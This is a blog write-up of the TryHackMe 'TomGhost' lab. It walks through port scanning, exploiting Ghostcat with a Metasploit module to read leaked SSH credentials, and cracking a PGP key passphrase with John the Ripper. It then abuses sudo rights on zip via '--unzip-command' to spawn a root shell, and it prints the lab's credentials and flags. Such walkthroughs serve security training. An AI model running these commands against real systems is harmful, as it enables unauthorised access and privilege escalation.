---
title: "TomGhost"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src="tomcat.jpeg" width=200 height=200 alt="tomcat">

## Enumeration

### nmap

```
PORT     STATE    SERVICE       REASON      VERSION
22/tcp   open     ssh           syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=
|   256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw
53/tcp   open     tcpwrapped    syn-ack
726/tcp  filtered unknown       no-response
5033/tcp filtered jtnetd-server no-response
8009/tcp open     ajp13         syn-ack     Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open     http          syn-ack     Apache Tomcat 9.0.30
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Apache tomcat server on port 8080 but no website is setup?

we search an exploit and with metasploit we use this

```
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against 10.10.212.86
Status Code: 200
Accept-Ranges: bytes
ETag: W/"1261-1583902632000"
Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
Content-Type: application/xml
Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
Licensed to the Apache Software Foundation (ASF) under one or more
contributor license agreements.  See the NOTICE file distributed with
this work for additional information regarding copyright ownership.
The ASF licenses this file to You under the Apache License, Version 2.0
(the "License"); you may not use this file except in compliance with
the License.  You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
-->

<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
version="4.0"
metadata-complete="true">

<display-name>Welcome to Tomcat</display-name>
<description>
Welcome to GhostCat
skyfuck:8730281lkjlkjdqlksalks
</description>

</web-app>

[+] 10.10.212.86:8080 - /home/its_a_me/.msf4/loot/20211029191143_default_10.10.212.86_WEBINFweb.xml_261102.txt
[*] Auxiliary module execution completed
```

Found credentials:

`skyfuck : 8730281lkjlkjdqlksalks`

ssh port open maybe we can ssh with those

bingo!

```
skyfuck@ubuntu:~$ whoami
skyfuck
```

we go straight home and find two folders

user merlin got our user flag

```
THM{tomcat_is_dead}
```

## Priviledge Escalation

The second folder have two files pgp and asc files

Might be key for decryption and privileges escalation?

I want those files...so I get them

I scp the whole skyfck folder from another terminal with

`scp -r skyfuck@10.10.152.29:/home/skyfuck .`

Time to crack that pgp

Tried to import the key but it asked for secret wordpass...wich I do not have

So we do some magic

`gpg2john tryhackme.asc > tryhackme.john`

its always rockyou.txt

```
john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme.john
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru (tryhackme)
1g 0:00:00:01 DONE (2021-10-29 20:05) 0.6896g/s 739.3p/s 739.3c/s 739.3C/s chinita..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

alexandru? what a passphrase

Anyway where were we?

```
gpg --import tryhackme.asc

gpg: clef 8F3DA3DEC6707170 : « tryhackme <stuxnet@tryhackme.com> » n'est pas modifiée
gpg: clef 8F3DA3DEC6707170 : clef secrète importée
gpg: clef 8F3DA3DEC6707170 : « tryhackme <stuxnet@tryhackme.com> » n'est pas modifiée
gpg: Quantité totale traitée : 2
gpg: non modifiées : 2
gpg: clefs secrètes lues : 1
gpg: clefs secrètes importées : 1
```

we check if its imported

```
gpg --list-secret-keys
/home/my_username/.gnupg/pubring.kbx

---

sec rsa1024 2020-06-30 [SC]
BBE208F0233D64B655742C07FFA4B5252BAEB2E6
uid [ inconnue] TryHackMe (Example Key)
ssb rsa1024 2020-06-30 [E]

sec dsa3072 2020-03-11 [SCA]
14B3794D5554349A715CDBA08F3DA3DEC6707170
uid [ inconnue] tryhackme <stuxnet@tryhackme.com>
ssb elg1024 2020-03-11 [E]
```

indeed..now we decrypt and output to a txt file

it tell us the ELG encrption method is unknown but anyway we cracked it

```
$gpg --output ./decrypted_credentials.txt --decrypt ./credential.pgp
gpg: Attention : l'algorithme de chiffrement CAST5 est introuvable
dans les préférences du destinataire
gpg: chiffré avec une clef ELG de 1024 bits, identifiant 61E104A66184FBCC, créée le 2020-03-11
« tryhackme <stuxnet@tryhackme.com> »
```

we get merlin credentials

`merlin : asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

Dafuk is that password? that boy merlin got issues

lateral movement to merlin and sudo rights

```
skyfuck@ubuntu:~$ su merlin
Password:
merlin@ubuntu:/home/skyfuck$

merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
(root : root) NOPASSWD: /usr/bin/zip
```

Lets ask gtfobins how to abuse this for shell spawn`

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

```
merlin@ubuntu:~$ zip
Copyright (c) 1990-2008 Info-ZIP - Type 'zip "-L"' for software license.
Zip 3.0 (July 5th 2008). Usage:
zip [-options] [-b path] [-t mmddyyyy] [-n suffixes] [zipfile list] [-xi list]
The default action is to add or replace zipfile entries from list, which
can include the special name - to compress standard input.
If zipfile and list are omitted, zip compresses stdin to stdout.
-f freshen: only changed files -u update: only changed or new files
-d delete entries in zipfile -m move into zipfile (delete OS files)
-r recurse into directories -j junk (don't record) directory names
-0 store only -l convert LF to CR LF (-ll CR LF to LF)
-1 compress faster -9 compress better
-q quiet operation -v verbose operation/print version info
-c add one-line comments -z add zipfile comment
-@ read names from stdin -o make zipfile as old as latest entry
-x exclude the following names -i include only the following names
-F fix zipfile (-FF try harder) -D do not add directory entries
-A adjust self-extracting exe -J junk zipfile prefix (unzipsfx)
-T test zipfile integrity -X eXclude eXtra file attributes
-y store symbolic links as the link instead of the referenced file
-e encrypt -n don't compress these suffixes
-h2 show more help
```

Technically we can abuse the `-T` flag that test a zip file integrity by running `--unzip-commands`

we create somefile and use `1` to zip faster

```
merlin@ubuntu:~$ touch somefile.txt
merlin@ubuntu:~$ ls
somefile.txt user.txt
merlin@ubuntu:~$ sudo zip 1.zip somefile.txt -T --unzip-command="sh -c /bin/bash"
adding: somefile.txt (stored 0%)
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Now we get our flag

```
root@ubuntu:/root# cat root.txt
THM{tomcat_ghost}
```

we find another `ufw` folder with a sh script

```
root@ubuntu:/root# cd ufw
root@ubuntu:/root/ufw# ls
ufw.sh
root@ubuntu:/root/ufw# ./ufw.sh
Firewall stopped and disabled on system startup
```

lol ok we control the firewall

nice room
